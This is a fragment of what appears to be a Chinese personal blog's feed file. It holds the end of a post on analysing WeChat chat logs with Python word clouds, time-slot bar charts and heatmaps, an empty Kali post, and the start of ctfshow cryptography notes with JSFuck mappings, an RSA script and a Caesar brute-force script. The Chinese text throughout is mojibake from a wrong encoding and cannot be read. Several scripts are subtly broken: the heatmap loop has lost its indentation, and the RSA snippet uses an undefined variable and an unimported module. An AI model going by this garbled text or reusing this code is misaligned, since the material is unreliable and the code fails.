class="string">&#x27;æ™•&#x27;</span>, <span class="string">&#x27;è¡°&#x27;</span>, <span class="string">&#x27;éª·é«…&#x27;</span>, <span class="string">&#x27;æ•²æ‰“&#x27;</span>, <span class="string">&#x27;å†è§&#x27;</span>, <span class="string">&#x27;æ“¦æ±—&#x27;</span>, <span class="string">&#x27;æŠ é¼»&#x27;</span>, <span class="string">&#x27;é¼“æŒ&#x27;</span>, <span class="string">&#x27;åç¬‘&#x27;</span>, <span class="string">&#x27;å³å“¼å“¼&#x27;</span>, <span class="string">&#x27;é„™è§†&#x27;</span>, <span class="string">&#x27;å§”å±ˆ&#x27;</span>, <span class="string">&#x27;å¿«å“­äº†&#x27;</span>, <span class="string">&#x27;é˜´é™©&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;äº²äº²&#x27;</span>, <span class="string">&#x27;å¯æ€œ&#x27;</span>, <span class="string">&#x27;ç¬‘è„¸&#x27;</span>, <span class="string">&#x27;ç”Ÿç—…&#x27;</span>, <span class="string">&#x27;è„¸çº¢&#x27;</span>, <span class="string">&#x27;ç ´æ¶•ä¸ºç¬‘&#x27;</span>, <span class="string">&#x27;ææƒ§&#x27;</span>, <span class="string">&#x27;å¤±æœ›&#x27;</span>, <span class="string">&#x27;æ— è¯­&#x27;</span>, <span class="string">&#x27;å˜¿å“ˆ&#x27;</span>, <span class="string">&#x27;æ‚è„¸&#x27;</span>, <span class="string">&#x27;å¥¸ç¬‘&#x27;</span>, <span class="string">&#x27;æœºæ™º&#x27;</span>, <span class="string">&#x27;çš±çœ‰&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;è€¶&#x27;</span>, <span class="string">&#x27;åƒç“œ&#x27;</span>, <span class="string">&#x27;åŠ æ²¹&#x27;</span>, <span class="string">&#x27;æ±—&#x27;</span>, <span class="string">&#x27;å¤©å•Š&#x27;</span>, <span class="string">&#x27;Emm&#x27;</span>, <span class="string">&#x27;ç¤¾ä¼šç¤¾ä¼š&#x27;</span>, <span class="string">&#x27;æ—ºæŸ´&#x27;</span>, <span class="string">&#x27;å¥½çš„&#x27;</span>, <span class="string">&#x27;æ‰“è„¸&#x27;</span>, <span class="string">&#x27;å“‡&#x27;</span>, <span class="string">&#x27;ç¿»ç™½çœ¼&#x27;</span>, <span class="string">&#x27;666&#x27;</span>, <span class="string">&#x27;è®©æˆ‘çœ‹çœ‹&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;å¹æ°”&#x27;</span>, <span class="string">&#x27;è‹¦æ¶©&#x27;</span>, <span class="string">&#x27;è£‚å¼€&#x27;</span>, <span class="string">&#x27;å˜´å”‡&#x27;</span>, <span class="string">&#x27;çˆ±å¿ƒ&#x27;</span>, <span class="string">&#x27;å¿ƒç¢&#x27;</span>, <span class="string">&#x27;æ‹¥æŠ±&#x27;</span>, <span class="string">&#x27;å¼º&#x27;</span>, <span class="string">&#x27;å¼±&#x27;</span>, <span class="string">&#x27;æ¡æ‰‹&#x27;</span>, <span class="string">&#x27;èƒœåˆ©&#x27;</span>, <span class="string">&#x27;æŠ±æ‹³&#x27;</span>, <span class="string">&#x27;å‹¾å¼•&#x27;</span>, <span class="string">&#x27;æ‹³å¤´&#x27;</span>, <span class="string">&#x27;OK&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;åˆå&#x27;</span>, <span class="string">&#x27;å•¤é…’&#x27;</span>, <span class="string">&#x27;å’–å•¡&#x27;</span>, <span class="string">&#x27;è›‹ç³•&#x27;</span>, <span class="string">&#x27;ç«ç‘°&#x27;</span>, <span class="string">&#x27;å‡‹è°¢&#x27;</span>, <span class="string">&#x27;èœåˆ€&#x27;</span>, <span class="string">&#x27;ç‚¸å¼¹&#x27;</span>, <span class="string">&#x27;ä¾¿ä¾¿&#x27;</span>, <span class="string">&#x27;æœˆäº®&#x27;</span>, <span class="string">&#x27;å¤ªé˜³&#x27;</span>, <span class="string">&#x27;åº†ç¥&#x27;</span>, <span class="string">&#x27;ç¤¼ç‰©&#x27;</span>, <span class="string">&#x27;çº¢åŒ…&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;ç™¼&#x27;</span>, <span class="string">&#x27;ç¦&#x27;</span>, <span class="string">&#x27;çƒŸèŠ±&#x27;</span>, <span class="string">&#x27;çˆ†ç«¹&#x27;</span>, <span class="string">&#x27;çŒªå¤´&#x27;</span>, <span class="string">&#x27;è·³è·³&#x27;</span>, <span class="string">&#x27;å‘æŠ–&#x27;</span>, <span class="string">&#x27;è½¬åœˆ&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¯»å–çˆ±å¿ƒå›¾ç‰‡æ–‡ä»¶å¹¶èµ‹å€¼ç»™ background å˜é‡</span></span><br><span class="line">background = imread(<span class="string">&#x27;heart.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line">wc = wordcloud.WordCloud(</span><br><span class="line">    font_path=<span class="string">&quot;SIMSUN.ttf&quot;</span>,</span><br><span class="line">    width=<span class="number">1000</span>,</span><br><span class="line">    height=<span class="number">1000</span>,</span><br><span class="line">    <span class="comment"># æ›¿æ¢ skyblue ä¸º hexcode å¯ä»¥è®¾ç½®ä»»æ„èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">    background_color=<span class="string">&quot;skyblue&quot;</span>,</span><br><span class="line">    max_words=<span class="number">200</span>,</span><br><span class="line">    <span class="comment"># é…ç½®åœæ­¢è¯å‚æ•°</span></span><br><span class="line">    stopwords=stopwords,</span><br><span class="line">    <span class="comment"># é…ç½®çˆ±å¿ƒå›¾ç‰‡é®ç½©</span></span><br><span class="line">    mask=background</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">wc.generate(text)</span><br><span class="line">wc.to_file(<span class="string">&quot;resultHeart.png&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/resultHeart1.png" alt="resultHeart"></p><p>å…¶ä¸­<code>background_color,</code>å¯ä»¥æ”¹æˆä»»æ„rgbï¼Œä¾‹å¦‚<code>background_color=&quot;#f0c9cf&quot;</code></p><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/resultHeart3.png" alt="resultHeart"></p><h3><span id="è¡¨æƒ…åŒ…ç»Ÿè®¡">è¡¨æƒ…åŒ…ç»Ÿè®¡</span></h3><p>æœ¬æ¥æƒ³<a href="https://worditout.com/%E6%9D%A5%E7%94%9F%E6%88%90Emoji%E7%BB%9F%E8%AE%A1%E5%9B%BE%E7%9A%84%EF%BC%8C%E4%BD%86%E6%98%AF%E5%BE%AE%E4%BF%A1%E7%9A%84Emoji%E9%83%BD%E6%98%AF%E8%87%AA%E5%88%B6%E7%9A%84%EF%BC%8C%E6%89%80%E4%BB%A5%E6%B2%A1%E5%8A%9E%E6%B3%95%E7%BB%9F%E8%AE%A1%E5%87%BA%E6%9D%A5%EF%BC%8CEmoji%E5%A5%BD%E5%83%8Fmatplotlib%E4%B9%9F%E6%98%BE%E7%A4%BA%E4%B8%8D%E5%87%BA%E6%9D%A5">https://worditout.com/æ¥ç”ŸæˆEmojiç»Ÿè®¡å›¾çš„ï¼Œä½†æ˜¯å¾®ä¿¡çš„Emojiéƒ½æ˜¯è‡ªåˆ¶çš„ï¼Œæ‰€ä»¥æ²¡åŠæ³•ç»Ÿè®¡å‡ºæ¥ï¼ŒEmojiå¥½åƒmatplotlibä¹Ÿæ˜¾ç¤ºä¸å‡ºæ¥</a></p><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/image-20231023161816052.png" alt="matplotlib"></p><p>è¢«è¿«ç”¨Excelç”»äº†ä¸€ä¸‹</p><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/image-20231023160911328.png" alt="excelå›¾"></p><h3><span id="æ—¶é—´åˆ†æ®µèŠå¤©é¢‘ç‡åˆ†æ">æ—¶é—´åˆ†æ®µèŠå¤©é¢‘ç‡åˆ†æ</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&#x27;/Users/disda/Desktop/Proj/wechat/db5/Chat_f611156ea3b00eb663747961911867d4.json&#x27;</span>).read()</span><br><span class="line">data = json.loads(data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">dict</span> = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> data:</span><br><span class="line">    <span class="comment"># è·å–æ¶ˆæ¯å‘é€æ—¶é—´</span></span><br><span class="line">    unixtime = (item[<span class="string">&#x27;msgCreateTime&#x27;</span>])</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(unixtime, <span class="built_in">int</span>):</span><br><span class="line">        value = datetime.datetime.fromtimestamp(unixtime).strftime(<span class="string">&#x27;%H:%M&#x27;</span>)</span><br><span class="line">        <span class="comment"># å¦‚æœåˆ†é’Ÿæ•°å°äº 30 åˆ™æŠŠåä¸¤ä½å˜æˆ 00</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(value[<span class="number">3</span>:]) &lt; <span class="number">30</span>:</span><br><span class="line">        value = value[:<span class="number">2</span>]+<span class="string">&#x27;00&#x27;</span></span><br><span class="line">        <span class="comment"># å¦‚æœåˆ†é’Ÿæ•°å¤§äº 30 åˆ™æŠŠåä¸¤ä½å˜æˆ 30</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        value = value[:<span class="number">2</span>]+<span class="string">&#x27;30&#x27;</span></span><br><span class="line">        <span class="comment"># å¦‚æœå­˜åœ¨è¿™ä¸ªæ—¶é—´ç‚¹å°±æŠŠè®¡æ•° +1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">dict</span>.get(value) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">dict</span>[value] = <span class="built_in">dict</span>.get(value)+<span class="number">1</span></span><br><span class="line">        <span class="comment"># å¦‚æœä¸å­˜åœ¨è¿™ä¸ªæ—¶é—´ç‚¹å°±åˆå§‹åŒ–è®¡æ•° = 1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">dict</span>[value] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¼€å§‹å¯¹ dict æ—¶åˆ»åˆ†åŒºç»“æœæ’åº</span></span><br><span class="line">sort_result = <span class="built_in">sorted</span>(<span class="built_in">dict</span>.items(), key=<span class="keyword">lambda</span> x:x[<span class="number">0</span>])</span><br><span class="line"><span class="comment"># å­˜å‚¨æ’åºä¹‹åçš„ç»“æœ</span></span><br><span class="line">result = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> sort_result:</span><br><span class="line">    result[item[<span class="number">0</span>]] = item[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¼å…¥å­—ä½“ç®¡ç†æ¨¡å—</span></span><br><span class="line"><span class="keyword">from</span> mplfonts <span class="keyword">import</span> use_font</span><br><span class="line"><span class="comment">#æŒ‡å®šä¸­æ–‡å­—ä½“</span></span><br><span class="line"></span><br><span class="line">axis_x=[i[:<span class="number">2</span>]+<span class="string">&#x27;\nç‚¹\n&#x27;</span>+i[<span class="number">2</span>:] <span class="keyword">for</span> i <span class="keyword">in</span> result]</span><br><span class="line">axis_y=[result[i] <span class="keyword">for</span> i <span class="keyword">in</span> result]</span><br><span class="line"></span><br><span class="line">plt.figure(figsize=(<span class="number">16</span>,<span class="number">9</span>))</span><br><span class="line">plt.bar(axis_x,axis_y)</span><br><span class="line">plt.xlabel(<span class="string">&quot;æ—¶é—´æ®µ&quot;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&quot;æ¶ˆæ¯æ•°é‡&quot;</span>)</span><br><span class="line">plt.title(<span class="string">&quot;å’Œå®å®èŠå¤©å“’æ—¶åŒºå›¾&quot;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/image-20231023161947587.png" alt="æ—¶åŒºå›¾"></p><h2><span id="èŠå¤©é¢‘ç‡çƒ­å›¾åˆ†æ">èŠå¤©é¢‘ç‡çƒ­å›¾åˆ†æ</span></h2><p>æœ€åè¿˜å¯ä»¥é€šè¿‡çƒ­åŠ›å›¾æ¥åˆ†æèŠå¤©çš„æ•°æ®ï¼Œæˆ‘ä»¬çŸ¥é“pythonä¸‹æ ‡ä»0å¼€å§‹ï¼Œå› æ­¤ç¬¬ä¸€å‘¨å°±ç”¨0è¡¨ç¤ºï¼Œä¸ç¬¦åˆæˆ‘ä»¬ä½¿ç”¨ä¹ æƒ¯ï¼Œæˆ‘ä»¬æå–å‘¨æ•°ç„¶åè¿›è¡Œï¼‹1æ“ä½œå³å¯ï¼ŒåŒç†Pythonä¸­å‘¨ä¸€ä¹Ÿç”¨0è¡¨ç¤ºï¼Œä¸€å¹¶åŠ ä¸€æ“ä½œå³å¯ã€‚ç„¶åå¾ªç¯ç»Ÿè®¡æ¯å‘¨ç»“æœï¼Œé€šè¿‡matplotlibç”»å›¾å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> mplfonts <span class="keyword">import</span> use_font</span><br><span class="line"><span class="comment"># å¯¼å…¥ SimHei å­—ä½“ï¼Œç¬¬ä¸€æ¬¡ä½¿ç”¨è¯·åœ¨é¡¹ç›®ç›®å½•ä¸­ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¯¼å…¥</span></span><br><span class="line"><span class="comment"># mplfonts init &amp;&amp; mplfonts install --update SimHei.ttf</span></span><br><span class="line">use_font(<span class="string">&#x27;SimHei&#x27;</span>)</span><br><span class="line"></span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&#x27;/Users/disda/Desktop/Proj/wechat/db5/Chat_f611156ea3b00eb663747961911867d4.json&#x27;</span>).read()</span><br><span class="line">data = json.loads(data)</span><br><span class="line"></span><br><span class="line">statistics_dict = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> data:</span><br><span class="line">unixtime = item.get(<span class="string">&#x27;msgCreateTime&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">isinstance</span>(unixtime, <span class="built_in">int</span>):</span><br><span class="line"><span class="comment"># key æ ¼å¼ï¼šå¹´ä»½.å‘¨</span></span><br><span class="line">week = <span class="built_in">int</span>(datetime.datetime.fromtimestamp(unixtime).strftime(<span class="string">&#x27;%Y%W&#x27;</span>)) + <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> statistics_dict.get(week) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"><span class="comment"># åˆå§‹åŒ–è¿™å‘¨çš„æ•°æ®ä¸ºå…¨ 0</span></span><br><span class="line">statistics_dict[week] = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line"><span class="comment"># å¯¹åº”çš„å¤©æ•° +1</span></span><br><span class="line">day = <span class="built_in">int</span>(datetime.datetime.fromtimestamp(unixtime).strftime(<span class="string">&#x27;%w&#x27;</span>))</span><br><span class="line">statistics_dict[week][day] = statistics_dict[week][day] + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¹æ•°æ®ç»“æœè¿›è¡Œæ’åº</span></span><br><span class="line">sort = <span class="built_in">sorted</span>(statistics_dict.items(), key=<span class="keyword">lambda</span> x:x[<span class="number">0</span>])</span><br><span class="line">values = []</span><br><span class="line">y_labels = []</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> sort:</span><br><span class="line">values.append(item[<span class="number">1</span>])</span><br><span class="line">y_labels.append(item[<span class="number">0</span>])</span><br><span class="line">x_labels = [ <span class="string">&quot;å‘¨æ—¥&quot;</span>, <span class="string">&quot;å‘¨ä¸€&quot;</span>, <span class="string">&quot;å‘¨äºŒ&quot;</span>, <span class="string">&quot;å‘¨ä¸‰&quot;</span>, <span class="string">&quot;å‘¨å››&quot;</span>, <span class="string">&quot;å‘¨äº”&quot;</span>, <span class="string">&quot;å‘¨å…­&quot;</span>]</span><br><span class="line"></span><br><span class="line">fig, axe = plt.subplots(figsize = (<span class="number">15</span>, <span class="number">150</span>))</span><br><span class="line">axe.set_xticks(np.arange(<span class="built_in">len</span>(x_labels)))</span><br><span class="line">axe.set_yticks(np.arange(<span class="built_in">len</span>(y_labels)))</span><br><span class="line">axe.set_xticklabels(x_labels)</span><br><span class="line">axe.set_yticklabels(y_labels)</span><br><span class="line">im = axe.imshow(values, cmap=plt.cm.Wistia)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ·»åŠ æ•°å€¼æ ‡ç­¾</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(y_labels)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x_labels)):</span><br><span class="line">        axe.text(j, i, values[i][j], ha=<span class="string">&quot;center&quot;</span>, va=<span class="string">&quot;center&quot;</span>, color=<span class="string">&quot;black&quot;</span>)</span><br><span class="line"></span><br><span class="line">axe.figure.colorbar(im, ax=axe)</span><br><span class="line">plt.savefig(<span class="string">&#x27;history.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/history.png" alt="history"></p><hr><p>å‚è€ƒğŸ”—ï¼š</p><p><a href="https://sspai.com/post/82577">å¯¼å‡ºå¤šå¹´å¾®ä¿¡èŠå¤©è®°å½•ï¼Œæˆ‘ç”¨å¯è§†åŒ–åˆ†æäº†å‡ºè‡ªå·±çš„å£å¤´ç¦…</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> python è¯äº‘ å¾®ä¿¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali</title>
      <link href="/2023/07/20/kali/"/>
      <url>/2023/07/20/kali/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#kali-%E5%AE%89%E8%A3%85-parallel-tools">Kali å®‰è£… Parallel Tools</a></li></ul><!-- tocstop --><h1><span id="kali-å®‰è£…-parallel-tools">Kali å®‰è£… Parallel Tools</span></h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-Crypto</title>
      <link href="/2023/05/08/ctfshow-Crypto/"/>
      <url>/2023/05/08/ctfshow-Crypto/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#crypto">Crypto</a><ul><li><a href="#javascript">JavaScript</a></li><li><a href="#rsa">RSA</a></li><li><a href="#rabbit%E5%8A%A0%E5%AF%86">RabbitåŠ å¯†</a></li><li><a href="#ook%E5%8A%A0%E5%AF%86">Ookï¼åŠ å¯†</a></li><li><a href="#brainfuck%E7%BC%96%E7%A0%81">BrainFuckç¼–ç </a></li><li><a href="#quoted-printable%E7%BC%96%E7%A0%81">Quoted-printableç¼–ç </a></li><li><a href="#md5">MD5</a></li><li><a href="#%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81caesar-cipher">å‡¯æ’’å¯†ç Caesar cipher</a></li><li><a href="#%E5%9F%83%E7%89%B9%E5%B7%B4%E4%BB%80%E7%A0%81">åŸƒç‰¹å·´ä»€ç </a></li><li><a href="#%E5%BD%93%E9%93%BA%E5%AF%86%E7%A0%81">å½“é“ºå¯†ç </a></li><li><a href="#%E8%B4%B9%E7%BA%B3%E5%A7%86%E5%AF%86%E7%A0%81">è´¹çº³å§†å¯†ç </a><ul><li><a href="#crypto13">crypto13</a></li></ul></li><li><a href="#%E5%9F%B9%E6%A0%B9%E5%AF%86%E7%A0%81">åŸ¹æ ¹å¯†ç </a><ul><li><a href="#%E8%90%8C%E6%96%B0-%E5%AF%86%E7%A0%813">èŒæ–° å¯†ç 3</a></li></ul></li></ul></li></ul><!-- tocstop --><h1><span id="crypto">Crypto</span></h1><p><a href="https://www.cnblogs.com/ruoli-s/p/14206145.html#brainfuck%E7%BC%96%E7%A0%81">CTFå¸¸è§ç¼–ç åŠåŠ è§£å¯†</a></p><h2><span id="javascript">JavaScript</span></h2><p><a href="http://www.hiencode.com/jsfuck.html">jsåœ¨çº¿åŠ è§£å¯†</a></p><p><a href="https://www.bugku.com/tools/jsfuck/">jsfuck</a></p><ul><li>false       &#x3D;&gt;  ![]</li><li>true        &#x3D;&gt;  !![]</li><li>undefined   &#x3D;&gt;  [][[]]</li><li>NaN         &#x3D;&gt;  +[![]]</li><li>0           &#x3D;&gt;  +[]</li><li>1           &#x3D;&gt;  +!+[]</li><li>2           &#x3D;&gt;  !+[]+!+[]</li><li>10          &#x3D;&gt;  [+!+[]]+[+[]]</li><li>Array       &#x3D;&gt;  []</li><li>Number      &#x3D;&gt;  +[]</li><li>String      &#x3D;&gt;  []+[]</li><li>Boolean     &#x3D;&gt;  ![]</li><li>Function    &#x3D;&gt;  [][â€œfilterâ€]</li><li>eval        &#x3D;&gt;  [][â€œfilterâ€][â€œconstructorâ€]( CODE )()</li><li>window      &#x3D;&gt;  [][â€œfilterâ€][â€œconstructorâ€](â€œreturn thisâ€)()</li></ul><h2><span id="rsa">RSA</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p=<span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">q=<span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">e=<span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="comment"># c=int(input())</span></span><br><span class="line"><span class="comment"># m=int(input())</span></span><br><span class="line">d=gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="comment"># m=pow(c,d,p*q)</span></span><br><span class="line"><span class="comment"># c=pow(m,e,p*q)</span></span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure><h2><span id="rabbitåŠ å¯†">RabbitåŠ å¯†</span></h2><ul><li>ç‰¹ç‚¹ï¼šU2FsdGVkX1å¼€å¤´çš„å¯èƒ½æ˜¯rabbitï¼ŒAESï¼ŒDES</li></ul><p><a href="https://tool.acy.moe/rabbitencrypt/">åœ¨çº¿åŠ è§£å¯†ç½‘ç«™</a></p><h2><span id="ookåŠ å¯†">Ookï¼åŠ å¯†</span></h2><ul><li>ç‰¹ç‚¹ï¼šåŒ…å«äº†Ook</li></ul><h2><span id="brainfuckç¼–ç ">BrainFuckç¼–ç </span></h2><ul><li>ç‰¹ç‚¹ï¼šå«+ç‡å¾ˆé«˜ï¼ŒBrainFuck è¯­è¨€åªæœ‰å…«ç§ç¬¦å·ï¼Œæ‰€æœ‰çš„æ“ä½œéƒ½ç”±è¿™å…«ç§ç¬¦å· <strong>(&gt; &lt; + - . , [ ])</strong> çš„ç»„åˆæ¥å®Œæˆã€‚</li></ul><h2><span id="quoted-printableç¼–ç ">Quoted-printableç¼–ç </span></h2><ul><li>ç‰¹ç‚¹ï¼šä»»ä½•ä¸€ä¸ª8ä½çš„å­—èŠ‚å€¼å¯ç¼–ç ä¸º3ä¸ªå­—ç¬¦ï¼šä¸€ä¸ªç­‰å·â€&#x3D;â€åè·Ÿéšä¸¤ä¸ªåå…­è¿›åˆ¶æ•°å­—(0â€“9æˆ–Aâ€“F)è¡¨ç¤ºè¯¥å­—èŠ‚çš„æ•°å€¼.</li></ul><p><a href="http://web.chacuo.net/charsetquotedprintable">è§£å¯†ç½‘ç«™</a></p><h2><span id="md5">MD5</span></h2><ul><li>ç‰¹ç‚¹ï¼šæœ‰å›ºå®šé•¿åº¦ï¼Œä¸€èˆ¬æ˜¯32ä½æˆ–è€…16ä½ï¼Œç”±æ•°å­—â€œ0-9â€å’Œå­—æ¯â€œa-fâ€ç»„æˆ</li></ul><p><a href="https://www.somd5.com/">å¯ä»¥è§£ä¸€äº›é•¿åº¦ä¸å¤Ÿçš„md5</a></p><h2><span id="å‡¯æ’’å¯†ç caesar-cipher">å‡¯æ’’å¯†ç Caesar cipher</span></h2><p>æˆ‘å†™äº†ä¸ªè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="comment"># å¯†æ–‡</span></span><br><span class="line">s=<span class="string">&#x27;gmbh&#123;ifmmp_dug&#125;&#x27;</span></span><br><span class="line">res = []</span><br><span class="line"><span class="comment"># ç­”æ¡ˆåŒ…å«çš„å­—ç¬¦ä¸²</span></span><br><span class="line">flag = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">26</span>):</span><br><span class="line">    str_decrypt=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span 